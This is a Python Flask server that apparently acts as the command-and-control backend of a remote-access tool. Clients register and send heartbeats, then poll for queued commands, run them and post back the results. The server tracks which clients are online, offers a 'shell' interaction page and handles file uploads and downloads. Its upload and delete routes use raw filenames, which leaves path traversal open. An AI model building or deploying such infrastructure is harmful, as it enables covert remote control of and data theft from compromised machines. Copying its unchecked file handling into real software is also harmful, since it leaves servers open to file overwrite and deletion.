from flask import Flask, request, jsonify, render_template, Response, send_from_directory
import os

from datetime import datetime, timedelta
from flask import abort
from werkzeug.utils import secure_filename


app = Flask(__name__)

clients = {}
current_image_url = None
# Store commands for the clients to execute
commands = {}

# Store results sent by the clients
results = {}
registered_clients = set()
# Directory where uploaded files will be saved
UPLOAD_FOLDER = 'uploaded_files'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
CLIENT_DOWN_TIMEOUT = timedelta(seconds=30)
CHECK_INTERVAL = 30
app.config['STATIC_FOLDER'] = 'uploaded_files'

# Ensure the upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def handle_file_upload(file):
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    filename = file.filename
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    # Generate the URL for the uploaded file
    uploaded_file_url = f"/uploaded_files/{filename}"

    return jsonify({"message": "File uploaded successfully", "file_url": uploaded_file_url}), 200





@app.route('/')
def home():
    return render_template('pass.html')

@app.route('/index')
def index():
    return render_template('index.html')

@app.route('/uploads')
def list_uploaded_files():
    filenames = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('uploads.html', filenames=filenames)

@app.route('/download/<filename>', methods=['GET', 'POST'])
def download_file(filename):
    if request.method == 'GET':
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
    elif request.method == 'POST':
        return "Method Not Allowed", 405
    else:
        return "Method Not Allowed", 405

@app.route('/delete_file/<filename>', methods=['DELETE'])
def delete_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    try:
        os.remove(file_path)
        return jsonify({"message": "File deleted successfully"}), 200
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' in request.files:
        file = request.files['file']
        return handle_file_upload(file)
    return "File uploaded successfully"

@app.route('/uploaded_files/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['STATIC_FOLDER'], filename)

@app.route('/Theshow', methods=['GET'])
def show_image():
    global current_image_url
    image_url = request.args.get('image')
    
    # Update the global variable with the current image URL
    current_image_url = image_url

    return render_template('share.html', image_url=image_url)

# Add other routes and functionality as needed

@app.route('/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    unsent_commands = commands.get(client_id, [])
    commands[client_id] = []  # Clear the commands for this client
    return jsonify({"commands": unsent_commands})

@app.route('/commands/<client_id>', methods=['POST'])
def add_command(client_id):
    command = request.json.get('command')
    if command:
        commands.setdefault(client_id, []).append(command)
        return jsonify({"message": "Command added successfully."}), 200
    else:
        return jsonify({"error": "No command provided."}), 400

@app.route('/results/<client_id>', methods=['POST'])
def receive_results(client_id):
    try:
        result = request.json
        if result and 'result' in result:
            results.setdefault(client_id, []).append(result['result'])
            print(results)
            return jsonify({"message": "Results received successfully."}), 200
        else:
            return jsonify({"error": "Invalid data format."}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/results/<client_id>', methods=['GET'])
def show_results(client_id):
    try:
        results_list = results.get(client_id, [])
        temp_results = "\n".join(str(result) for result in results_list)
        results.pop(client_id, None)  # Remove the results for this client
        return Response(temp_results, content_type='text/plain')
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')

    if client_id:
        if client_id not in clients:
            clients[client_id] = {"registered": False, "last_connection": datetime.now()}
            registered_clients.add(client_id)  # Add to the set of registered clients
            return jsonify({"client_id": client_id}), 200
        else:
            return jsonify({"error": "Client already registered with this ID"}), 400
    else:
        return jsonify({"error": "No client ID provided"}), 400

@app.route('/get_clients', methods=['GET'])
def get_clients():
    client_ids = list(clients.keys())  # Assuming clients is a global dictionary
    return jsonify({"client_ids": client_ids})


@app.route('/clients', methods=['GET'])
def show_clients():
    global registered_clients  # Make sure to use the global set

    up_clients = [client_id for client_id, client_info in clients.items() if client_info.get('registered', False)]
    down_clients = [client_id for client_id, client_info in clients.items() if client_id not in up_clients]

    # Update the status of clients based on last connection time
    current_time = datetime.now()
    for client_id, client_info in clients.items():
        last_connection_time = client_info.get('last_connection')
        if last_connection_time and (current_time - last_connection_time).total_seconds() > CHECK_INTERVAL:
            if client_info.get('registered', False):
                print(f"Client {client_id} went down.")
                registered_clients.remove(client_id)  # Remove from the set of registered clients
            client_info['registered'] = False

    return render_template('clients.html', clients=clients, up_clients=up_clients, down_clients=down_clients)


@app.route('/check_connection/<client_id>', methods=['GET'])
def check_connection(client_id):
    client_info = clients.get(client_id)
    if client_info:
        client_info['last_connection'] = datetime.now()
        if not client_info.get('registered', False):
            print(f"Client {client_id} came up.")
            registered_clients.add(client_id)  # Add to the set of registered clients
        client_info['registered'] = True  # Mark the client as online
        return jsonify({"message": "Connection checked successfully."}), 200
    else:
        abort(404, description=f"Client with ID {client_id} not found.")


@app.route('/interact', methods=['GET', 'POST'])
def interact():
    if request.method == 'POST':
        # Handle the POST request logic here
        data = request.get_json()
        clientID = data.get('clientID')
        # Your logic for handling the POST request

        return jsonify({"message": "POST request handled successfully"})
    else:
        # Handle the GET request logic here
        clientID = request.args.get('clientID')
        # Your logic for handling the GET request

        return render_template('shell.html', clientID=clientID)


if __name__ == '__main__':
    app.run(debug=False, port=5000)
